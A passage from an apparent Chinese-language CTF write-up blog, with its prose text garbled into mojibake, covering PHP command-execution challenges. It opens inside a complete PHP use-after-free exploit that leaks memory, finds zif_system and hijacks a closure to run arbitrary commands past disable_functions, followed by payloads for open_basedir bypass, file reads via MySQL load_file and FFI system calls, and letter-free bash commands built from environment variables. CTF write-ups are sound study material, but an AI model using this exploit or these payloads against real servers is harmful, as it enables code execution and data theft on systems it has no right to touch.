check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> =str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> Vuln();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="web-73"><a href="#web-73" class="headerlink" title="web 73:"></a>web 73:</h3><p>æœ¬é¢˜æ²¡æœ‰äº†open_basedirçš„é™åˆ¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload:c=include(&quot;/flagc.txt&quot;);exit();</span></span><br></pre></td></tr></table></figure><h3 id="web-74"><a href="#web-74" class="headerlink" title="web 74:"></a>web 74:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload:c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot;||&quot;;&#125;exit();</span></span><br><span class="line"><span class="comment">#payload:c=include(&quot;/flagx.txt&quot;);exit();</span></span><br></pre></td></tr></table></figure><h3 id="web-75ï¼Œ76-é€šè¿‡æ•°æ®åº“load-fileå‡½æ•°ç»•è¿‡open-basedirçš„é™åˆ¶"><a href="#web-75ï¼Œ76-é€šè¿‡æ•°æ®åº“load-fileå‡½æ•°ç»•è¿‡open-basedirçš„é™åˆ¶" class="headerlink" title="web 75ï¼Œ76:é€šè¿‡æ•°æ®åº“load_fileå‡½æ•°ç»•è¿‡open_basedirçš„é™åˆ¶"></a>web 75ï¼Œ76:é€šè¿‡æ•°æ®åº“load_fileå‡½æ•°ç»•è¿‡open_basedirçš„é™åˆ¶</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload:c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot;||&quot;;&#125;exit();</span></span><br><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);<span class="comment">//è¿æ¥æ•°æ®åº“</span></span><br><span class="line">       </span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)<span class="comment">//åˆ©ç”¨load_fileåŠ è½½æ–‡ä»¶flag36.txt</span></span><br><span class="line">      &#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå§¿åŠ¿ä¹Ÿå¤ªç¥å¥‡äº†ã€‚ä½†æ˜¯é¦–å…ˆå¾—æ‹¿åˆ°æ•°æ®åº“å¾—é…ç½®æ–‡ä»¶ã€‚</p><h3 id="web-77-FFIè¯»å–æ–‡ä»¶-PHP-gt-7-4"><a href="#web-77-FFIè¯»å–æ–‡ä»¶-PHP-gt-7-4" class="headerlink" title="web 77:FFIè¯»å–æ–‡ä»¶(PHP&gt;=7.4)"></a>web 77:FFIè¯»å–æ–‡ä»¶(PHP&gt;=7.4)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload:c=$ffi=FFI::cdef(&quot;int system(char *command);&quot;, &quot;libc.so.6&quot;);$a=&#x27;/readflag &gt; 1.txt&#x27;;$ffi-&gt;system($a);exit(); </span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FFIï¼ˆForeign <span class="function"><span class="keyword">Function</span> <span class="title">Interface</span>ï¼‰ï¼Œå³å¤–éƒ¨å‡½æ•°æ¥å£ï¼Œæ˜¯æŒ‡åœ¨ä¸€ç§è¯­è¨€é‡Œè°ƒç”¨å¦ä¸€ç§è¯­è¨€ä»£ç çš„æŠ€æœ¯ã€‚<span class="title">PHP</span>çš„<span class="title">FFI</span>æ‰©å±•å°±æ˜¯ä¸€ä¸ªè®©ä½ åœ¨<span class="title">PHP</span>é‡Œè°ƒç”¨<span class="title">C</span>ä»£ç çš„æŠ€æœ¯ã€‚</span></span><br><span class="line"><span class="function">$<span class="title">ffi</span> = <span class="title">FFI</span>::<span class="title">cdef</span>(<span class="params"><span class="string">&quot;int system(const char *command);&quot;</span></span>)</span>;<span class="comment">//åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>cat /flag36x.txt &gt; <span class="number">1</span>.txt<span class="string">&#x27;;//å› ä¸ºæ²¡æœ‰å›æ˜¾</span></span><br><span class="line"><span class="string">$ffi-&gt;system($a);//é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°</span></span><br><span class="line"><span class="string">ä½†æ˜¯flag36x.txtæ˜¯ç©ºçš„ã€‚é‚£ä¹ˆæˆ‘ä»¬æ‰§è¡Œreadflagå‘½ä»¤å§ã€‚</span></span><br></pre></td></tr></table></figure><h3 id="web-118-Linuxä¸‹ç¯å¢ƒå˜é‡çš„å¦™ç”¨"><a href="#web-118-Linuxä¸‹ç¯å¢ƒå˜é‡çš„å¦™ç”¨" class="headerlink" title="web 118:Linuxä¸‹ç¯å¢ƒå˜é‡çš„å¦™ç”¨"></a>web 118:Linuxä¸‹ç¯å¢ƒå˜é‡çš„å¦™ç”¨</h3><p>å¦‚å›¾æ‰€ç¤ºï¼š</p><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/AKgjwTkDeVR4OuG.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916205528133"></p><p>æœ¬é¢˜è¿‡æ»¤äº†å°å†™å­—æ¯ã€‚é‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨åˆ‡ç‰‡æŠ€æœ¯æ¥æ„é€ æˆ‘ä»¬çš„Payloadã€‚å¯ä»¥çœ‹å‡º~å¤§å†™å­—æ¯å–æœ€åä¸€ä½ã€‚<img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/AKgjwTkDeVR4OuG.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p><p>åŠ ä¸ŠHinté‡Œé¢çš„è¿™å¼ å›¾ã€‚å½“å‰ç›®å½•åœ¨é¢˜ç›®ä¸­è‚¯å®šæ˜¯${PWD}=/var/www/html.  è€Œ${PATH}ä¸€èˆ¬éƒ½æ˜¯ä»¥binç»“å°¾ï¼Œé‚£ä¹ˆæ„é€ nl flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload:$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span></span><br></pre></td></tr></table></figure><h3 id="web-119-120ï¼šLinuxä¸‹ç¯å¢ƒå˜é‡çš„å¦™ç”¨"><a href="#web-119-120ï¼šLinuxä¸‹ç¯å¢ƒå˜é‡çš„å¦™ç”¨" class="headerlink" title="web 119,120ï¼šLinuxä¸‹ç¯å¢ƒå˜é‡çš„å¦™ç”¨"></a>web 119,120ï¼šLinuxä¸‹ç¯å¢ƒå˜é‡çš„å¦™ç”¨</h3><p>æœ¬é¢˜ç¦ç”¨äº†${PATH}å› æ­¤æˆ‘ä»¬éœ€è¦å¯»æ‰¾å…¶å®ƒä»£æ›¿ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åœ¨LINUXä¸‹ $&#123;<span class="comment">#å˜é‡&#125; ä»£è¡¨çš„æ˜¯å˜é‡å€¼çš„é•¿åº¦ã€‚å¦‚$&#123;#$a&#125; a=12345ã€‚é‚£ä¹ˆ$&#123;#$a&#125;=5ã€‚å¯ä»¥ç†è§£ä¸ºstrlenå‡½æ•°åŒæ•ˆæœã€‚</span></span><br><span class="line">$&#123;SHLVL&#125; çš„å€¼ä¸€èˆ¬ä¸º<span class="number">1</span>.é‚£ä¹ˆ$&#123;<span class="comment">#$&#123;SHLVL&#125;&#125;=1</span></span><br><span class="line">$&#123;RANDOM&#125;:è¿”å›<span class="number">0</span>~<span class="number">32767</span>çš„ä¸€ä¸ªéšæœºæ•°ï¼Œå…¶ä¸­<span class="number">4</span>ä½æ•°å’Œ<span class="number">5</span>ä½æ•°çš„æ¦‚ç‡æ›´å¤§ã€‚é‚£ä¹ˆ$&#123;<span class="comment">#RANDOM&#125;=4æˆ–5çš„æ¦‚ç‡æ›´å¤§ã€‚</span></span><br><span class="line">é‚£ä¹ˆæˆ‘ä»¬é‡‡ç”¨ä¸Šé¢çš„åŒ¹é…å‘½ä»¤è¿›è¡Œç›²æ‰“ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload:$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span></span><br><span class="line">=&gt;/bin/base64 flag.php å¯èƒ½éœ€è¦å¤šè¯•å‡ æ¬¡ï¼Œå› ä¸ºè¿™ä¸ªrandomåå‡º<span class="number">4</span>æ˜¯éšæœºçš„ã€‚</span><br></pre></td></tr></table></figure><h3 id="web-121-SHLVLè¿‡æ»¤äº†"><a href="#web-121-SHLVLè¿‡æ»¤äº†" class="headerlink" title="web 121:SHLVLè¿‡æ»¤äº†"></a>web 121:SHLVLè¿‡æ»¤äº†</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åœ¨linuxä¸‹ã€‚$&#123;<span class="comment">#?&#125;=1</span></span><br><span class="line"><span class="comment">#payload1:$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span></span><br><span class="line"><span class="comment">#payload2:$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???</span></span><br><span class="line">å› ä¸ºè¿™é‡Œ$&#123;<span class="comment">#IFS&#125;æ˜¯ä¸€ä¸ªç©ºæ ¼ç¬¦ï¼Œtabå­—ç¬¦ï¼Œæ¢è¡Œç¬¦ã€‚é‚£ä¹ˆé•¿åº¦ä¸º.å³$&#123;PWD:3:1&#125;è€ŒPWDä¸‹/var/www/htmlã€‚</span></span><br><span class="line">é‚£ä¹ˆåˆšå¥½åŒ¹é…åˆ°rã€‚å†åˆ©ç”¨rev flag.php æ–‡ä»¶ä¸­æ¯è¡Œé€†åºè¾“å‡º</span><br></pre></td></tr></table></figure><h3 id="web-122-è¿‡æ»¤äº†PWD"><a href="#web-122-è¿‡æ»¤äº†PWD" class="headerlink" title="web 122:è¿‡æ»¤äº†PWD"></a>web 122:è¿‡æ»¤äº†PWD</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload:code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span></span><br><span class="line">yuå¸ˆå‚…è¯´$&#123;&#125;çš„æŠ¥é”™åœ¨æœ¬åœ°è¿”å›æ—¶<span class="number">1</span>ï¼Œä½†æ˜¯é¢˜ç›®ç¯å¢ƒæ˜¯<span class="number">2</span>ï¼Œæ‰€ä»¥æ”¾å¼€äº†&lt;</span><br><span class="line">&lt;Açš„æŠ¥é”™è¿”å›ä¹Ÿæ˜¯<span class="number">1</span>ï¼Œæ‰€ä»¥å°±æˆåŠŸå¾—åˆ°äº†æ•°å­—<span class="number">1</span>ï¼Œè‡³äºæ•°å­—<span class="number">4</span>æ‹¿RANDOMéšæœºå°±å¯ä»¥äº†ã€‚</span><br></pre></td></tr></table></figure><h3 id="web-124-CISCN-2019-LOVE-MATH"><a href="#web-124-CISCN-2019-LOVE-MATH" class="headerlink" title="web 124:CISCN 2019 LOVE MATH"></a>web 124:CISCN 2019 LOVE MATH</h3><p>å›½èµ›çš„ä¸€é“åŸé¢˜ã€‚æ ¸å¿ƒè€ƒç‚¹æ˜¯æ— å­—æ¯æ•°å­—çš„webshellå’Œæ•°å­¦å‡½æ•°çš„åˆ©ç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span 